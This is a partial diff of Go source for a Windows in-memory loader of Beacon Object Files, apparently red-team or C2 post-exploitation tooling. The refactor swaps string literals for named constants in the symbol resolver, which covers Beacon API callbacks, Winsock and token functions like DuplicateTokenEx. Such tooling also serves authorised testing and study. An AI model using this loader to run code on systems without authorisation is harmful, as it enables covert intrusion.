-			procGetLastError := kernel32.MustFindProc("GetLastError")
+		case coffApiGetLastError:
+			kernel32 := syscall.MustLoadDLL(coffDllKernel32)
+			procGetLastError := kernel32.MustFindProc(coffApiGetLastError)
 
 			return windows.NewCallback(func() uintptr {
 				ret, _, _ := procGetLastError.Call()
@@ -172,7 +335,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 			})
 
 		// MSVCRT functions - Custom implementations
-		case "strlen":
+		case coffFnStrlen:
 			return windows.NewCallback(func(str uintptr) uintptr {
 				if str == 0 {
 					return 0
@@ -190,7 +353,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return uintptr(length)
 			})
 
-		case "strcmp":
+		case coffFnStrcmp:
 			return windows.NewCallback(func(str1, str2 uintptr) uintptr {
 				if str1 == 0 && str2 == 0 {
 					return 0
@@ -224,7 +387,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "strncmp":
+		case coffFnStrncmp:
 			return windows.NewCallback(func(str1, str2, n uintptr) uintptr {
 				if n == 0 {
 					return 0
@@ -256,7 +419,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "_stricmp":
+		case coffFnStricmp:
 			return windows.NewCallback(func(str1, str2 uintptr) uintptr {
 				if str1 == 0 && str2 == 0 {
 					return 0
@@ -298,7 +461,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "_strnicmp":
+		case coffFnStrnicmp:
 			return windows.NewCallback(func(str1, str2, n uintptr) uintptr {
 				if n == 0 {
 					return 0
@@ -338,7 +501,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "strcpy":
+		case coffFnStrcpy:
 			return windows.NewCallback(func(dst, src uintptr) uintptr {
 				if dst == 0 || src == 0 {
 					return dst
@@ -358,7 +521,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return dst
 			})
 
-		case "strncpy":
+		case coffFnStrncpy:
 			return windows.NewCallback(func(dst, src, n uintptr) uintptr {
 				if dst == 0 || src == 0 || n == 0 {
 					return dst
@@ -381,7 +544,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return dst
 			})
 
-		case "strcat":
+		case coffFnStrcat:
 			return windows.NewCallback(func(dst, src uintptr) uintptr {
 				if dst == 0 || src == 0 {
 					return dst
@@ -418,7 +581,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return dst
 			})
 
-		case "strncat":
+		case coffFnStrncat:
 			return windows.NewCallback(func(dst, src, n uintptr) uintptr {
 				if dst == 0 || src == 0 {
 					return dst
@@ -452,7 +615,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 
 				return dst
 			})
-		case "strstr":
+		case coffFnStrstr:
 			return windows.NewCallback(func(haystack, needle uintptr) uintptr {
 				if haystack == 0 || needle == 0 {
 					return 0
@@ -506,7 +669,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "calloc":
+		case coffFnCalloc:
 			return windows.NewCallback(func(num, size uintptr) uintptr {
 				totalSize := num * size
 				if totalSize == 0 {
@@ -530,7 +693,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return ptr
 			})
 
-		case "malloc":
+		case coffFnMalloc:
 			return windows.NewCallback(func(size uintptr) uintptr {
 				if size == 0 {
 					return 0
@@ -546,7 +709,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return ptr
 			})
 
-		case "free":
+		case coffFnFree:
 			return windows.NewCallback(func(ptr uintptr) uintptr {
 				if ptr == 0 {
 					return 0
@@ -561,7 +724,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "realloc":
+		case coffFnRealloc:
 			return windows.NewCallback(func(ptr, size uintptr) uintptr {
 				if size == 0 {
 					// Free the memory
@@ -616,7 +779,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return newPtr
 			})
 
-		case "memcpy":
+		case coffFnMemcpy:
 			return windows.NewCallback(func(dst, src, size uintptr) uintptr {
 				if dst == 0 || src == 0 || size == 0 {
 					return dst
@@ -627,7 +790,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return dst
 			})
 
-		case "memset":
+		case coffFnMemset:
 			return windows.NewCallback(func(ptr, value, size uintptr) uintptr {
 				if ptr == 0 || size == 0 {
 					return ptr
@@ -639,7 +802,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return ptr
 			})
 
-		case "memmove":
+		case coffFnMemmove:
 			return windows.NewCallback(func(dst, src, size uintptr) uintptr {
 				if dst == 0 || src == 0 || size == 0 {
 					return dst
@@ -659,7 +822,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return dst
 			})
 
-		case "memcmp":
+		case coffFnMemcmp:
 			return windows.NewCallback(func(ptr1, ptr2, size uintptr) uintptr {
 				if ptr1 == 0 && ptr2 == 0 {
 					return 0
@@ -684,41 +847,41 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "vsnprintf", "_vsnprintf":
+		case coffFnVsnprintf, coffFnVsnprintfU:
 			// Simplified vsnprintf - just return 0 for now
 			return windows.NewCallback(func(buffer, size, format, args uintptr) uintptr {
 				return 0
 			})
 
-		case "sprintf":
+		case coffFnSprintf:
 			// Simplified sprintf
 			return windows.NewCallback(func(buffer, format, arg0, arg1, arg2, arg3, arg4 uintptr) uintptr {
 				return 0
 			})
 
 		// User32 functions
-		case "MessageBoxA", "MessageBoxW", "GetDesktopWindow", "GetForegroundWindow",
-			"GetWindowTextA", "GetWindowTextW", "FindWindowA", "FindWindowW":
-			libName = "user32.dll"
+		case coffApiMessageBoxA, coffApiMessageBoxW, coffApiGetDesktopWindow, coffApiGetForegroundWnd,
+			coffApiGetWindowTextA, coffApiGetWindowTextW, coffApiFindWindowA, coffApiFindWindowW:
+			libName = coffDllUser32
 
 		// WS2_32 functions (Winsock)
-		case "WSAStartup", "WSACleanup", "WSAGetLastError", "socket", "closesocket",
-			"bind", "listen", "accept", "connect", "send", "recv", "sendto",
-			"recvfrom", "select", "gethostbyname", "gethostbyaddr", "inet_addr",
-			"inet_ntoa", "htons", "htonl", "ntohs", "ntohl":
-			libName = "ws2_32.dll"
+		case coffApiWSAStartup, coffApiWSACleanup, coffApiWSAGetLastErr, coffApiSocket, coffApiClosesocket,
+			coffApiBind, coffApiListen, coffApiAccept, coffApiConnect, coffApiSend, coffApiRecv, coffApiSendto,
+			coffApiRecvfrom, coffApiSelect, coffApiGethostbyname, coffApiGethostbyaddr, coffApiInet_addr,
+			coffApiInet_ntoa, coffApiHtons, coffApiHtonl, coffApiNtohs, coffApiNtohl:
+			libName = coffDllWs2_32
 
 		// Advapi32 functions
-		case "RegOpenKeyExA", "RegCloseKey", "RegQueryValueExA", "RegSetValueExA",
-			"OpenProcessToken", "GetTokenInformation", "SetTokenInformation",
-			"DuplicateTokenEx", "CreateProcessAsUserA":
-			libName = "advapi32.dll"
+		case coffApiRegOpenKeyExA, coffApiRegCloseKey, coffApiRegQueryValueExA, coffApiRegSetValueExA,
+			coffApiOpenProcessToken, coffApiGetTokenInformation, coffApiSetTokenInformation,
+			coffApiDuplicateTokenEx, coffApiCreateProcessAsUserA:
+			libName = coffDllAdvapi32
 
 		// Beacon API functions
-		case "BeaconOutput":
+		case coffFnBeaconOutput:
 			return windows.NewCallback(GetCoffOutputForChannel(outChannel))
 
-		case "BeaconDataParse":
+		case coffFnBeaconDataParse:
 			return windows.NewCallback(func(parser uintptr, buffer uintptr, size uintptr) uintptr {
 				p := (*DataParser)(unsafe.Pointer(parser))
 				p.original = buffer
@@ -729,7 +892,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return 0
 			})
 
-		case "BeaconDataInt":
+		case coffFnBeaconDataInt:
 			return windows.NewCallback(func(parser uintptr) uintptr {
 				p := (*DataParser)(unsafe.Pointer(parser))
 				var size uint32
@@ -737,7 +900,7 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return result
 			})
 
-		case "BeaconDataShort":
+		case coffFnBeaconDataShort:
 			return windows.NewCallback(func(parser uintptr) uintptr {
 				p := (*DataParser)(unsafe.Pointer(parser))
 
@@ -764,13 +927,13 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return uintptr(value)
 			})
 
-		case "BeaconDataLength":
+		case coffFnBeaconDataLength:
 			return windows.NewCallback(func(parser uintptr) uintptr {
 				p := (*DataParser)(unsafe.Pointer(parser))
 				return DataLength(p)
 			})
 
-		case "BeaconDataExtract":
+		case coffFnBeaconDataExtract:
 			return windows.NewCallback(func(parser uintptr, sizePtr uintptr) uintptr {
 				p := (*DataParser)(unsafe.Pointer(parser))
 
@@ -823,50 +986,50 @@ func resolveExternalAddress(symbolName string, outChannel chan<- interface{}) ui
 				return dataPtr
 			})
 
-		case "BeaconPrintf":
+		case coffFnBeaconPrintf:
 			return windows.NewCallback(GetCoffPrintfForChannel(outChannel))
 
-		case "BeaconFormatAlloc", "BeaconFormatFree", "BeaconFormatAppend",
-			"BeaconFormatPrintf", "BeaconFormatToString", "BeaconFormatInt":
+		case coffFnBeaconFormatAlloc, coffFnBeaconFormatFree, coffFnBeaconFormatAppend,
+			coffFnBeaconFormatPrintf, coffFnBeaconFormatToStr, coffFnBeaconFormatInt:
 			// Stubs for now
 			return 0
 
 		// Helper functions from base.c
-		case "bofstart":
+		case coffFnBofstart:
 			return windows.NewCallback(bofStart)
-		case "internal_printf":
+		case coffFnInternalPrintf:
 			return windows.NewCallback(GetInternalPrintfForChannel(outChannel))
-		case "printoutput":
+		case coffFnPrintoutput:
 			return windows.NewCallback(printOutput)
-		case "intAlloc":
+		case coffFnIntAlloc:
 			return windows.NewCallback(intAlloc)
-		case "intFree":
+		case coffFnIntFree:
 			return windows.NewCallback(intFree)
-		case "intMemset":
+		case coffFnIntMemset:
 			return windows.NewCallback(intMemset)
-		case "intMemcpy":
+		case coffFnIntMemcpy:
 			return windows.NewCallback(intMemcpy)
-		case "intRealloc":
+		case coffFnIntRealloc:
 			return windows.NewCallback(intRealloc)
-		case "intStrlen":
+		case coffFnIntStrlen:
 			return windows.NewCallback(intStrlen)
-		case "intStrcmp":
+		case coffFnIntStrcmp:
 			return windows.NewCallback(intStrcmp)
-		case "intStrncmp":
+		case coffFnIntStrncmp:
 			return windows.NewCallback(intStrncmp)
-		case "intStrcpy":
+		case coffFnIntStrcpy:
 			return windows.NewCallback(intStrcpy)
-		case "intStrncpy":
+		case coffFnIntStrncpy:
 			return windows.NewCallback(intStrncpy)
-		case "intStrcat":
+		case coffFnIntStrcat:
 			return windows.NewCallback(intStrcat)
-		case "intStrncat":
+		case coffFnIntStrncat:
 			return windows.NewCallback(intStrncat)
-		case "toWideChar":
+		case coffFnToWideChar:
 			return windows.NewCallback(toWideChar)
-		case "Utf8ToUtf16":
+		case coffFnUtf8ToUtf16:
 			return windows.NewCallback(Utf8ToUtf16)
-		case "Utf16ToUtf8":
+		case coffFnUtf16ToUtf8:
 			return windows.NewCallback(Utf16ToUtf8)
 
 		default:
@@ -940,7 +1103,7 @@ func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, 
 	for _, symbol := range parsedCoff.Symbols {
 		if symbol.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber == 0 {
 			symbolName := symbol.NameString()
-			if strings.HasPrefix(symbolName, "__imp_") {
+			if strings.HasPrefix(symbolName, coffPrefixImp) {
 				// Check for duplicate GOT entries
 				if _, exists := gotMap[symbolName]; !exists {
 					gotMap[symbolName] = 0 // Placeholder
@@ -968,7 +1131,7 @@ func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, 
 		allocationSize := uintptr(section.SizeOfRawData)
 
 		// Handle BSS section specially
-		if strings.HasPrefix(sectionName, ".bss") {
+		if strings.HasPrefix(sectionName, coffSectionBss) {
 			if bssSize > 0 {
 				allocationSize = uintptr(bssSize)
 			} else if section.VirtualSize > 0 {
@@ -1003,7 +1166,7 @@ func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, 
 		sectionAddresses[i] = addr
 
 		// Copy section data
-		if len(section.RawData()) > 0 && !strings.HasPrefix(sectionName, ".bss") {
+		if len(section.RawData()) > 0 && !strings.HasPrefix(sectionName, coffSectionBss) {
 			copySize := min(len(section.RawData()), int(allocationSize))
 			_, _, err = procRtlCopyMemory.Call(
 				addr,
@@ -1062,7 +1225,7 @@ func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, 
 			if symbol.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber == 0 {
 				// External symbol
 				symbolName := symbol.NameString()
-				if strings.HasPrefix(symbolName, "__imp_") {
+				if strings.HasPrefix(symbolName, coffPrefixImp) {
 					// Import symbol - check if already resolved
 					if existingAddr, exists := gotAllocs[symbolName]; exists {
 						symbolDefAddress = existingAddr
@@ -1086,7 +1249,7 @@ func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, 
 					}
 				} else {
 					// BSS symbol
-					bssSection := sections[".bss"]
+					bssSection := sections[coffSectionBss]
 					if bssSection.Address != 0 {
 						symbolDefAddress = bssSection.Address + uintptr(bssOffset)
 						bssOffset += int(symbol.Value)
